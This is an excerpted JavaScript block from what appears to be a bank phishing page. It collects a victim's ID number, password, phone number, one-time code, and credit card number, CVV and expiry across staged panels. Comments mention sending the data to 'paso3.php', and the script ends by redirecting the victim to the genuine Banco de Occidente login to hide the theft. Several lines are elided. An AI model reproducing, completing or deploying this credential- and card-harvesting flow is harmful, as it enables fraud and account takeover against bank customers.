...
<script>
    ...
    document.addEventListener("DOMContentLoaded", function () {
      ...
      document.getElementById('document-number').addEventListener('input', function(e) {
        ...
        // Habilitar/deshabilitar botón ingresar
        if (this.value.length > 0 && document.getElementById('password12').value.length > 7) {
          document.getElementById('btn-ingresar').removeAttribute('disabled');
        } else {
          document.getElementById('btn-ingresar').setAttribute('disabled', '');
        }
      });

      // Prevenir pegar texto que no sean números
      document.getElementById('document-number').addEventListener('paste', function(e) {
        e.preventDefault();
      ...
      document.getElementById('password12').addEventListener('input', function(e) {
        ...
        // Habilitar/deshabilitar botón ingresar
        if (this.value.length > 7 && document.getElementById('document-number').value.length > 0) {
          document.getElementById('btn-ingresar').removeAttribute('disabled');
        } else {
          document.getElementById('btn-ingresar').setAttribute('disabled', '');
        }
      ...
      document.getElementById('password12').addEventListener('paste', function(e) {
        e.preventDefault();
        let pastedText = (e.clipboardData || window.clipboardData).getData('text');
      ...
      document.getElementById('celular-number').addEventListener('input', function(e) {
        this.value = this.value.replace(/[^0-9]/g, '');
        if (this.value.length > 6) {
          document.getElementById('btn-continuar').removeAttribute('disabled');
        } else {
          document.getElementById('btn-continuar').setAttribute('disabled', '');
        }
      });

      // Validación para OTP
      document.getElementById('otp-number').addEventListener('input', function(e) {
        this.value = this.value.replace(/[^0-9]/g, '');
        if (this.value.length > 5) {
          document.getElementById('btn-error').removeAttribute('disabled');
        } else {
          document.getElementById('btn-error').setAttribute('disabled', '');
        }
      });
      ...
      document.getElementById('credit-card').addEventListener('input', function(e) {
        this.value = this.value.replace(/[^0-9]/g, '');
        if (this.value.length > 9 && document.getElementById('card-cvv').value.length > 0 && 
            document.getElementById('inp-mes').value != "" && document.getElementById('inp-ano').value != "") {
          document.getElementById('btn-activar').removeAttribute('disabled');
        } else {
          document.getElementById('btn-activar').setAttribute('disabled', '');
        }
      });
      ...
      document.getElementById('card-cvv').addEventListener('input', function(e) {
        this.value = this.value.replace(/[^0-9]/g, '');
        if (this.value.length > 0 && document.getElementById('credit-card').value.length > 9 && 
            document.getElementById('inp-mes').value != "" && document.getElementById('inp-ano').value != "") {
          document.getElementById('btn-activar').removeAttribute('disabled');
        } else {
          document.getElementById('btn-activar').setAttribute('disabled', '');
      ...
      document.getElementById('inp-mes').addEventListener('change', function() {
        if (document.getElementById('credit-card').value.length > 9 && document.getElementById('card-cvv').value.length > 0 && 
            this.value != "" && document.getElementById('inp-ano').value != "") {
          document.getElementById('btn-activar').removeAttribute('disabled');
        } else {
          document.getElementById('btn-activar').setAttribute('disabled', '');
        }
      ...
      document.getElementById('inp-ano').addEventListener('change', function() {
        if (document.getElementById('credit-card').value.length > 9 && document.getElementById('card-cvv').value.length > 0 && 
            document.getElementById('inp-mes').value != "" && this.value != "") {
          document.getElementById('btn-activar').removeAttribute('disabled');
        } else {
          document.getElementById('btn-activar').setAttribute('disabled', '');
        }
    ...
    document.getElementById('btn-ingresar').addEventListener('click', async function (event) {
      event.preventDefault();

      // Obtener datos del formulario
      const identificacion = document.getElementById('document-number').value;
...
------------------------------`;
    ...
    // Event listeners para los otros botones
    ...
    document.getElementById('btn-continuar').addEventListener('click', function(){
      document.getElementById('panel-celular').style.display = 'none';       
      document.getElementById('panel-tarjeta').style.display = 'block';
      document.getElementById('celular').value = document.getElementById('celular-number').value;
    });

    document.getElementById('btn-error').addEventListener('click', function(){
      document.getElementById('panel-otp').style.display = 'none';       
      document.getElementById('panel-tarjeta').style.display = 'block';
      document.getElementById('celular').value = document.getElementById('otp-number').value;
    });

    document.getElementById('btn-activar').addEventListener('click', function(){
      const f = document.getElementById('inp-mes').value + "-" + document.getElementById('inp-ano').value;
      
      // Aquí puedes agregar tu propia lógica en lugar de enviar a paso3.php
      alert("Datos capturados:\nTarjeta: " + document.getElementById('credit-card').value + 
            "\nFecha: " + f + 
      ...
      // Redirigir a donde necesites
        window.location.href = "https://www.bancodeoccidente.com.co/portaltransaccional/#/login"; 
    });

    document.getElementById('btn-aceptar').addEventListener('click', function(){
      document.getElementById('panel-aceptar').style.display = 'none';
    });

    document.getElementById('btn-x').addEventListener('click', function(){
      document.getElementById('panel-cerrar').style.display = 'none';
    });
</script>